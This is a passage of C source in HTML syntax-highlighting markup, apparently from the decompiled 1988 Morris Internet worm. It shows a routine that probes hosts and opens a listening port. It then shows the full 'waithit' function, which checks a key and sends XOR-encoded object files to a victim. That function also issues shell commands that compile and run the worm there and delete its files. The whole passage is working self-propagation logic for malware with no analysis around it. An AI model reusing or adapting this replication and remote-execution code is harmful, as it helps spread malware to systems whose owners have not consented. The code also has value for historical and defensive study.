     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">arg8</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">arg12</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">arg16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">arg20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">arg24</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">namelen</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sin1</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc1">/* 16 bytes */</span><span class="sc0">
    
    </span><span class="sc10">*</span><span class="sc11">arg20</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">random</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ffffff</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">sin1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin1</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sin1</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc10">-&gt;</span><span class="sc11">l12</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">            </span><span class="sc1">/* 64, 274 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">arg8</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 266 */</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 470 */</span><span class="sc0">
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">sin0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin0</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sin0</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin0</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPPORT_TELNET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin0</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arg8</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">namelen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">getsockname</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">namelen</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc10">*</span><span class="sc11">arg12</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sin1</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">        </span><span class="sc1">/* 286,466 */</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 470 */</span><span class="sc0">
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">sin0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin0</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sin0</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin0</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">random</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0xffff</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bind</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">listen</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">arg16</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sin0</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">arg24</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Check for somebody connecting.  If there is a connection and he has the rig
ht
 * key, send out the
 * a complete set of encoded objects to it. */</span><span class="sc0">

</span><span class="sc11">waithit</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg4</span><span class="sc10">)</span><span class="sc0">        </span><span class="sc1">/* 0x3e86 */</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">save_sighand</span><span class="sc10">)();</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sin_size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l24</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l28</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc1">/* 44 */</span><span class="sc0">
    </span><span class="sc11">object</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">obj</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">][</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">            </span><span class="sc1">/* File list, 2608 */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">l2612</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">strbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc11">save_sighand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">signal</span><span class="sc10">(</span><span class="sc11">SIGPIPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">justreturn</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">sin_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">*</span><span class="sc4">60</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">l8</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">accept</span><span class="sc10">(</span><span class="sc11">arg4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin_size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">quit</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/* 1144 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xread</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l16</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">quit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">l16</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ntohl</span><span class="sc10">(</span><span class="sc11">l16</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">l16</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">quit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nobjects</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">    </span><span class="sc1">/* 164,432 */</span><span class="sc0">
    </span><span class="sc11">obj</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">objects</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">l16</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htonl</span><span class="sc10">(</span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l16</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"x%d,%s"</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc11">random</span><span class="sc10">()&amp;</span><span class="sc4">0x00ffffff</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]));</span><span class="sc0">
    </span><span class="sc11">xorbuf</span><span class="sc10">(</span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">l24</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xorbuf</span><span class="sc10">(</span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l24</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">quit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc1">/* Get rid of my client's key, and tell him the list has ended. */</span><span class="sc0">
    </span><span class="sc11">l16</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l16</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">quit</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* Don't run up the load average too much... */</span><span class="sc0">
    </span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">test_connection</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">quit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"PATH=/bin:/usr/bin:/usr/ucb\n"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"rm -f sh\n"</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">strbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"if [ -f sh ]\nthen\nP=x%d\nelse\nP=sh\nfi\n"</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">random</span><span class="sc10">()&amp;</span><span class="sc4">0x00ffffff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbuf</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nobjects</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">    </span><span class="sc1">/* 636,1040 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">l2612</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">l2612</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'o'</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">strbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"cc -o $P %s\n"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbuf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">test_connection</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">quit</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/* 1144 */</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">strbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"./$P -p $$ "</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">l28</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l28</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nobjects</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l28</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc1">/* 820,892 */</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">strbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">l28</span><span class="sc10">]);</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">strbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">strbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbuf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">test_connection</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">arg4</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 1172 */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"rm -f $P\n"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nobjects</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">    </span><span class="sc1">/* 1044,1122 */</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">strbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"rm -f %s $P\n"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbuf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">test_connection</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">quit</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">l24</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

